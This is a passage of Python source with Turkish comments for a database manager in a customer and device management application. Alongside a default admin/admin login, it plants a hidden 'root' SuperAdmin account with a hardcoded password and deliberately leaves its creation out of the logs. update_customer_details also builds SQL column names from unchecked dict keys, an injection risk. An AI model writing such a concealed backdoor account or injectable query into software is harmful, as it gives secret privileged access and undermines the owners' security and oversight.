                hashed_password = bcrypt.hashpw(b'admin', bcrypt.gensalt()).decode('utf-8')
                self.execute_query(
                    "INSERT INTO users (username, password_hash, role) VALUES (?, ?, ?)",
                    ('admin', hashed_password, 'Admin')
                )
                logging.info("Varsayılan 'admin' kullanıcısı oluşturuldu.")
            except Exception as e:
                logging.error(f"Admin kullanıcısı oluşturulürken hata: {e}", exc_info=True)
        
        # Gizli root kullanıcısını oluştur
        self._create_root_user()
    
    def _create_root_user(self) -> None:
        """Gizli 'root' kullanıcısını, eğer mevcut değilse, oluşturur."""
        if not self.fetch_one("SELECT id FROM users WHERE username = 'root'"):
            try:
                hashed_password = bcrypt.hashpw(b'8648', bcrypt.gensalt()).decode('utf-8')
                self.execute_query(
                    "INSERT INTO users (username, password_hash, role) VALUES (?, ?, ?)",
                    ('root', hashed_password, 'SuperAdmin')
                )
                # Root kullanıcısı oluşturulduğunda log'a yazmayalım (gizli olsun)
            except Exception as e:
                logging.error(f"Root kullanıcısı oluşturulurken hata: {e}", exc_info=True)
    
    def get_setting(self, key: str, default: Any = None) -> Any:
        """
        Settings tablosundan belirli bir ayarı alır.
        
        Args:
            key (str): Ayar anahtarı
            default (Any): Ayar bulunamazsa döndürülecek varsayılan değer
            
        Returns:
            Any: Ayar değeri veya varsayılan değer
        """
        try:
            result = self.fetch_one("SELECT value FROM settings WHERE key = ?", (key,))
            return result[0] if result else default
        except Exception as e:
            logging.error(f"Ayar okunurken hata ({key}): {e}", exc_info=True)
            return default
    
    def get_all_customers_and_devices(self) -> Dict[str, list]:
        """Tüm müşterileri ve her müşterinin cihazlarını döndürür."""
        customers = self.fetch_all("SELECT * FROM customers")
        customers_list = []
        for cust in customers:
            cust_dict = dict(cust)
            cust_dict["devices"] = self.get_customer_devices(cust_dict["id"])
            customers_list.append(cust_dict)
        return {
            "customers": customers_list
        }
    
    def update_customer_details(self, customer_id: int, details: dict) -> None:
        """Müşteri bilgilerini günceller."""
        if not details:
            return
        set_clause = ', '.join([f"{key} = ?" for key in details.keys()])
        params = list(details.values()) + [customer_id]
        query = f"UPDATE customers SET {set_clause} WHERE id = ?"
        self.execute_query(query, tuple(params))
# Eski kodlarla uyumluluk için global bir nesne oluşturulabilir,
# ancak en iyi pratik, ihtiyaç duyulan yerde `DatabaseManager()`'ı çağırmaktır.
db_manager = DatabaseManager()
